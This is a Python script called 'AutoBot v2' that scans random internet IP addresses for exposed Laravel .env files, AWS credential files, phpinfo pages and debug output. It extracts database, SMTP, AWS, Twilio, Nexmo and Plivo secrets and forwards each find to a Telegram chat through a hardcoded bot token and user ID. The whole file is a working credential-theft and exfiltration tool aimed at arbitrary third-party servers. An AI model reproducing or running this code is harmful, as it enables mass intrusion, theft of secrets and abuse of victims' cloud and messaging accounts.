from requests.packages.urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
import threading
import queue
import requests
import re
import time
import struct
import random
import socket
import telebot
import sys
import bs4
import copy

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ====  EDIT BAGIAN INI ====
env_path = (".env", ".env.bak", "aws.yml", "config/aws.yml",
            "phpinfo", ".aws/credentials", "phpinfo.php", "info.php")
keywords = {
    "database": [
        "DB_CONNECTION", "DB_HOST", "DB_PORT",
        "DB_DATABASE", "DB_USERNAME",  "DB_PASSWORD"],
    "appkey": ["APP_KEY"],
    "twilio": [
        "TWILIO_ACCOUNT_SID", "TWILIO_API_KEY", "TWILIO_API_SECRET",
        "TWILIO_SID", "TWILIO_AUTH_TOKEN", "TWILIO_TOKEN",
        "TWILIO_CHAT_SERVICE_SID", "TWILIO_NUMBER"],
    "nexmo": [
        "NEXMO_KEY", "NEXMO_SECRET", "NEXMO_FROM"],
    "plivo": [
        "PLIVO_AUTH_ID", "PLIVO_AUTH_TOKEN", "PLIVO_APP_ID"
        "PLIVO_ID", "PLIVO_AUTH_TOKEN", "PLIVO_TOKEN", "PLIVO_APP_ID"],
    "smtp": [
        'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD',
        "MAIL_FROM_ADDRESS", "MAIL_FROM_NAME"],

    "apache": [
        "Apache Version", "Server Administrator", "Hostname:Port"
    ],
    # aws
    "aws_access_key": [
        "aws_access_key_id", "SES_KEY", "SQS_KEY",
        "DYNAMODB_KEY_ID", "DYNAMODB_KEY", "AWS_KEY_ID",
        "SNS_KEY", "S3_KEY", "EC2_KEY", "AWS_ACCESS_KEY_ID",
        "SES_ACCESS_KEY", "SQS_ACCESS_KEY", "DYNAMODB_ACCESS_KEY"
        "SNS_ACCESS_KEY", "S3_ACCESS_KEY", "EC2_ACCESS_KEY"],
    "aws_secret_key": [
        "aws_secret_access_key", "S3_SECRET", "SNS_SECRET", "AWS_SECRET_ACCESS_KEY",
        "SQS_SECRET", "SES_SECRET", "AWS_SECRET_ACCESS_KEY"],
    "aws_bucket": ["AWS_BUCKET", "S3_BUCKET"],
    "aws_region": ["S3_REGION", "SNS_REGION", "SQS_REGION"],
    "aws_url": ["aws_url"],


    # etc
    "etc": [
        "NEXMO", "NEXMO_KEY",
    "SENDGRID",
    "AWS_SQS", "SQS_KEY", "SQS_ACCESS_KEY",
    "AWS_SNS", "SNS_KEY", "SNS_ACCESS_KEY",
    "AWS_S3", "S3_ACCESS_KEY", "S3_KEY",
    "AWS_SES", "SES_ACCESS_KEY", "SES_KEY",
    "AWS_KEY", "AWS_ACCESS_KEY",
    "DYNAMODB", "DYNAMODB_KEY",
    "PLIVO",
    "smtp.office365",
    "smtp.ionos",
    "TWILIO", "twilio",
    "email-smtp",
    "aws_access_key_id",
    "SMTP_HOST", "MAIL_USERNAME", "MAIL_PASSWORD"
    ]
}

TELEGRAM_ACCESS_TOKEN = "7030115282:AAHjA5ndhd2hKYmT_CgTT_JsiV5nMp6REZc"
USER_ID = 5052025978
UPDATE_INTERVAL_IN_MINUTE = 60
SEND_IN_SECONDS = 1
PRINT_SITE_DOWN = 0

# ==== STOP ======

client = telebot.TeleBot(TELEGRAM_ACCESS_TOKEN)
xhreg = None

try:
    client.get_me()
    client.get_chat(USER_ID)
    
    ch = input("""
\x1b[92m
  ___        _       ______       _
 / _ \      | |      | ___ \     | |
/ /_\ \_   _| |_ ___ | |_/ / ___ | |_
|  _  | | | | __/ _ \| ___ \/ _ \| __|
| | | | |_| | || (_) | |_/ / (_) | |_
\_| |_/\__,_|\__\___/\____/ \___/ \__|\x1b[0m v2

1. lock head ip
2. auto

? choose: """.strip("\n"))
    assert ch in ["1", "2"]

    if ch == "1":
        xhreg = re.compile(r"^(?:%s)\." % (
            "|".join(map(
                re.escape, re.split(r"\s*,\s*", input("? input head: "))
            ))
        ))
    thread = int(input("? thread: "))

    print(("=" * 25) + "\nbot started: " + time.strftime("%c"))
except Exception as e:
    exit("Error: " + str(e))

# ==== !!!!!!!!! ====

s = []
stop = False
total_ = 0


def send_worker():
    start = time.perf_counter()
    while not stop or len(s) > 0:
        while len(s) > 0:
            item = s.pop(0)
            client.send_message(USER_ID, item, parse_mode="Markdown")
            print("\x1b[92m%s\x1b[0m: message has been sent:\n%s" %
                  (threading.currentThread().name, item))

        time.sleep(SEND_IN_SECONDS)

        end = int(time.perf_counter() - start)
        if end % (60 * UPDATE_INTERVAL_IN_MINUTE) == 0:
            client.send_message(
                USER_ID, "#update: _%s ip successfully processed_" % total_, parse_mode="Markdown")


# ==== !!!!!!! =====

class GrabAnything:
    _fn = set()
    _soup = {}

    def __init__(self):
        if len(self._fn) < 1:
            for fn in dir(self):
                if fn.startswith("grab_"):
                    self._fn.add(getattr(self, fn))

    def valid(self, s):
        if not s:
            return ""

        s = s.strip("\n\"' ")
        if s in ("no value", "null", "true"):
            return ""
        return s

    @property
    def threadName(self):
        return threading.currentThread().name

    def value(self, raw_name, *args, **kwargs):
        soup = self._soup[self.threadName]
        re_name = re.compile(r"(?i)\s*%s\s*" % raw_name, *args, **kwargs)
        name = soup.find(text=re_name)

        if name:
            sf_dump = name.findNext(class_="sf-dump-str")
            if sf_dump:
                x = self.valid(sf_dump.text)
                if x: return x

            value_ = name.findNext(text=True)
            if value_:
                x = self.valid(value_.string)
                if x: return x

        reg = re.compile(r"(?i)%s=([^>]+?)(?:\n|$)" %
                         raw_name, *args, **kwargs)
        value = reg.search(str(soup))
        if value:
            return self.valid(value.group(1))

    def build(self, args, fn=lambda x: x):
        items = []
        for key in args:
            value = fn(key)
            if value:
                items.append(f"{key}={value}")
        if len(items) < 1:
            return None
        return "\n".join(items)

    def grabAll(self, raw, msg=None):
        with lock:
            self._soup[self.threadName] = bs4.BeautifulSoup(raw, "html.parser")

        status = False
        header = msg or ""
        for fn in self._fn:
            name = fn.__name__[5:].replace("_", "")
            resp = fn()

            if resp:
                print("\x1b[92m%s\x1b[0m: found credential: \x1b[92m%s\x1b[0m" % (
                    self.threadName, name))

                resp = resp.strip()
                t = 3 if resp.count("\n") > 0 else 1

                if t == 3:
                    resp = "\n" + resp
                if not resp.startswith("`"):
                    resp = f"{'`' * t}{resp}"
                if not resp.endswith("`"):
                    resp = f"{resp}{'`' * t}"

                resp = ("===== #%s =====\n"
                        "%s" % (name.upper(), resp))
                with lock:
                    s.append(header + resp)
                    status = True
        return status

    # == Grab Fn: Tambahin sendiri kalau paham ====

    def grab_database(self):
        return self.build(keywords["database"], fn=self.value)

    def grab_apache(self):
        return self.build(keywords["apache"], fn=self.value)

    def grab_nexmo(self):
        return self.build(keywords["nexmo"], fn=self.value)

    def grab_twilio(self):
        return self.build(keywords["twilio"], fn=self.value)

    def grab_plivo(self):
        return self.build(keywords["plivo"], fn=self.value)

    def grab_app_key(self):
        key = self.value("APP_KEY")
        if not key or not key.startswith("base64:"):
            return
        return f"APP_KEY={key}"

    def grab_smtp(self):
        return self.build(keywords["smtp"], fn=self.value)

    def grab_aws(self):
        def get_region():
            yreg = re.compile('(?i)us\\-east\\-1|us\\-east\\-2|us\\-west\\-1|us\\-west\\-2|af\\-south\\-1|ap\\-east\\-1|ap\\-south\\-1|ap\\-northeast\\-1|ap\\-northeast\\-2|ap\\-northeast\\-3|ap\\-southeast\\-1|ap\\-southeast\\-2|ca\\-central\\-1|eu\\-central\\-1|eu\\-west\\-1|eu\\-west\\-2|eu\\-west\\-3|eu\\-south\\-1|eu\\-north\\-1|me\\-south\\-1|sa\\-east\\-1')
            text = yreg.search(str(self._soup[self.threadName]))
            if text:
                return text.group()

        dat = {k: v for k, v in keywords.items() if k.startswith("aws")}

        r = {}
        for k, v in dat.items():
            name = "|".join(map(re.escape, v))
            value = self.value(name)
            if value:
                r[k] = value
        if not r.get("aws_region"):
            region = get_region()
            if region:
                r["aws_region"] = region

        region = r.get("aws_region")

        if region and len(r) < 2:
            return

        resp = ""
        for k, v in r.items():
            resp += f"{k.upper()}={v}\n"
        return resp

    # == END ==


q = queue.Queue()

q.put("http://3.1.108.34")

lock = threading.Lock()
ga = GrabAnything()

etc_key = keywords["etc"]
alias = {i[0].upper(): i[1] for i in etc_key if not isinstance(i, str)}

xreg = re.compile("(?i)" + r"|".join(
    r"(?P<%s>%s)" % (
        k, "|".join(
            map(lambda bv: re.escape(bv if isinstance(bv, str) else bv[0]), v))
    ) for k, v in keywords.items()
))


def is_alive(url):
    try:
        r = requests.head(url, timeout=3, allow_redirects=True)
        return r.status_code
    except Exception as e:
        return False


def worker():
    global total_
    while not stop:
        url = q.get()

        try:
            parsed = urlparse(url)
            url = "http://{}".format(
                parsed.netloc or url.split("/", 1)[0].split("|")[0])
            tname = threading.currentThread().name

            if is_alive(url):
                result = None
                method = ""

                try:
                    print("\x1b[34m%s\x1b[0m: %s (POST)" % (tname, url))
                    r = requests.post(url, data=[],
                                      verify=False, timeout=3,
                                      headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                    res_t = xreg.findall(r.text)
                    if res_t:
                        method = "DEBUG"
                        result = (res_t, r.text)

                except Exception:
                    pass

                if result is None:
                    for path in env_path:
                        try:
                            print(
                                "\x1b[34m%s\x1b[0m: %s/%s (GET)" % (tname, url, path))
                            r = requests.get("/".join([url, path]), allow_redirects=False,
                                             verify=False, timeout=3,
                                             headers={'User-agent': 'Mozilla/5.0 (X11 Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'})
                            res_t = xreg.findall(r.text)
                            if res_t:
                                method = path
                                result = (res_t, r.text)
                                break
                        except Exception as e:
                            pass

                if result is not None:
                    result, raw = result

                    print(
                        "\x1b[92m%s\x1b[0m: found %s matches credentials: \x1b[92m%s\x1b[0m (%s)" % (tname, len(result), url, method))

                    ip = re.sub(r"^https?://", "", url)
                    try:
                        host = socket.gethostbyaddr(ip)[0]
                        if is_alive(host):
                            url = "http://" + host
                    except Exception:
                        pass

                    x = ("- url: %s\n"
                         "- ip: `%s`\n"
                         "- method: `%s`\n\n"

                         "" % (url + ("/" + method if method != "DEBUG" else ""),
                               ip, method))
                    if not ga.grabAll(raw, msg=x):
                        x = x.strip()

                        fo = set()
                        for i in set(result):
                            for y in filter(None, i):
                                y = y.upper()
                                fo.add(alias.get(y, y))

                        if len(fo) > 0:
                            x += "\n- found: "
                            x += ", ".join("`%s`" % i for i in fo)

                        with lock:
                            s.append(x)

                else:
                    print(
                        "\x1b[91m%s\x1b[0m: %s: \x1b[93mNo Credentials\x1b[0m" % (tname, url))
            else:
                if PRINT_SITE_DOWN:
                    print("\x1b[91m%s\x1b[0m: %s: Site Down!" % (tname, url))
        except Exception as e:
            if hasattr(e, "args") and len(e.args) == 2:
                e = e.args[1]
            print("\x1b[91m%s\x1b[0m: Error: %s" % (tname, str(e).strip()))

        with lock:
            total_ += 1

        q.task_done()


def rand_v4():
    while not stop:
        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        if xhreg is None or xhreg.search(ip):
            yield ip


th = threading.Thread(target=send_worker)
th.setDaemon(True)
th.start()


threads = [th]

try:
    for _ in range(thread):
        th = threading.Thread(target=worker)
        th.setDaemon(True)
        th.start()

        threads.append(th)

    for line in rand_v4():
        while q.qsize() > thread:
            continue
        q.put(line)

    q.join()

except:
    pass

try:
    stop = True
    for i in threads:
        if i.is_alive() and not q.empty():
            print(
                "\x1b[93m%s\x1b[0m: waiting for the data to finish processing" % i.name)
            i.join()
except:
    pass
